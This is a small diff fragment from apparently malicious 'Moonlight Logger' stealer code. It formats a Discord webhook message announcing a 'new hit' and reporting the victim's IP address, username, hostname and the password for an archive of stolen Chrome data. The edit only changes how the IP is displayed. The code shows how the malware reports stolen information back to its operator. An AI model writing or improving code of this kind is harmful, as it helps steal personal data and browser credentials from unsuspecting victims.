@@ -275,7 +275,7 @@ Date last Used: {dateLastUsed}
             title="Moonlight Logger | New hit! 🌙", color=8134084)
         infoEmbed.add_embed_field(
             name="Computer Information",
-            value=f"```IP Address: {ip}\nUsername: {userName}\nHostname: {hostName}```")
+            value=f"""`IP Address:` ||`{ip}`||\n```Username: {userName}\nHostname: {hostName}```""")
         infoEmbed.add_embed_field(
             name="Chrome Data",
             value=f"```Archive Decryption Password: {self.password}```",
